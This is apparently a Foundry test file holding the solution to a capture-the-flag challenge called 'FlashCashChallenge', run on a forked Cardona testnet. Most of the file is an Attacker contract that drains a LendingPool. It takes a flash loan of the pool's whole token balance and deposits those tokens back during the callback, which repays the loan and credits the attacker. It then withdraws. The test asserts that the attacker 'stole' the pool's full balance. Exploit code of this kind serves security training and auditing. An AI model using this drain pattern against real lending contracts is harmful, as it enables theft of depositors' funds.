// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {LendingPool} from "src/v2/flash-cash/LendingPool.sol";

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IFlashLoanEtherReceiver {
    function execute() external;
}

contract Attacker is IFlashLoanEtherReceiver {

    LendingPool public lendingPool;

    constructor(address _lendingPoolAddress) {
        lendingPool = LendingPool(_lendingPoolAddress);
    }

    function withdraw() public {
        lendingPool.withdraw();
    }

    function flashloan() public {
        uint256 _balance = IERC20(lendingPool.CRDNA()).balanceOf(address(lendingPool));
        lendingPool.flashLoan(_balance);
    }

    function execute() external override {
        uint256 _balance = IERC20(lendingPool.CRDNA()).balanceOf(address(this));
        IERC20(lendingPool.CRDNA()).approve(address(lendingPool), _balance);
        lendingPool.deposit(_balance);
    }
}

contract FlashCashChallenge is Test {

    Attacker private _attacker;

    LendingPool private _lendingPool;

    IERC20 public constant CRDNA = IERC20(0x94ab230b92A3f2899e81d46d4E874c6F006c88Aa);

    function setUp() external {

        vm.selectFork(vm.createFork(vm.envString("CARDONA_RPC_URL")));

        address _lendingPoolAddress = address(0); // TODO
        _lendingPool = LendingPool(_lendingPoolAddress);

        _attacker = new Attacker(_lendingPoolAddress);
    }

    function testSolution() external {

        /** PRE ATTACK ASSERTS */

        assertTrue(CRDNA.balanceOf(address(_lendingPool)) > 0, "FlashCashChallenge: LendingPool has no balance");
        assertTrue(CRDNA.balanceOf(address(_attacker)) == 0, "FlashCashChallenge: attacker already has a balance");

        uint256 _lendingPoolBalanceBefore = CRDNA.balanceOf(address(_lendingPool));

        /** ATTACK */

        _attacker.flashloan();
        _attacker.withdraw();

        /** POST ATTACK ASSERTS */

        assertTrue(CRDNA.balanceOf(address(_attacker)) >= _lendingPoolBalanceBefore, "FlashCashChallenge: attacker did not steal enough");
        assertTrue(CRDNA.balanceOf(address(_lendingPool)) == 0, "FlashCashChallenge: LendingPool still has a balance");
    }
}